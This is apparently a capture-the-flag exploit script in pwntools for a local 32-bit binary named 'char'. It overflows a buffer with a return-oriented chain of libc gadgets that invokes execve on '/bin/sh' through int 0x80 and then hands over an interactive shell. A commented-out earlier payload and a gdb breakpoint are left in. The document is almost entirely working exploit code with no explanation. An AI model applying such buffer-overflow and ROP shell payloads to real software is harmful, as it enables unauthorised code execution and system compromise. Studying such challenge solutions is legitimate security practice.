from pwn import *
context(log_level = "debug")

p = process("./char")

base_addr = 0x5555E000
p_ebx = 0x55693065

pad = 0x55555555

addr_ecx = 0x55555555

g1 = base_addr+0x00145453 # pop esi ; pop edi ; pop ebp ; pop ebx ; xor eax, eax ; ret

g2 = base_addr+0x00019349 # xchg eax, ecx ; add al, 5 ; add byte ptr [eax], al ; pop ebx ; ret

g3 = base_addr+0x00097b7a # inc eax ; pop esi ; pop edi ; pop ebp ; ret

g4 = base_addr+0x00109176 # inc esi ; int 0x80

g5 = base_addr+0x00174a51 # pop ecx ; add al, 0xa ; ret

sh = base_addr+0x00165476


payload = p32(g5) + p32(addr_ecx) + p32(g1) + p32(pad)*4 + p32(g2) + p32(pad) + p32(g1) + p32(pad)*3 + p32(sh) + (p32(g3) + p32(pad)*3)*11 + p32(g4)

# pad = 0x55555555

# g1 = base_addr+0x00145453 # pop esi ; pop edi ; pop ebp ; pop ebx ; xor eax, eax ; ret

# g2 = base_addr+0x00019349 # xchg eax, ecx ; add al, 5 ; add byte ptr [eax], al ; pop ebx ; ret

# g3 = base_addr+0x00097b7a # inc eax ; pop esi ; pop edi ; pop ebp ; ret

# g4 = base_addr+0x00109176 # inc esi ; int 0x80

# sh = base_addr+0x00165476


# payload = p32(g1) + p32(pad)*4 + p32(g2) + p32(pad) + p32(g1) + p32(pad)*3 + p32(sh) + (p32(g3) + p32(pad)*3)*11 + p32(g4)


gdb.attach(p,"b*0x8048690\nc")
p.recvuntil("GO : ) \n")
p.sendline("a"*(0x1c+4)+payload)

p.interactive()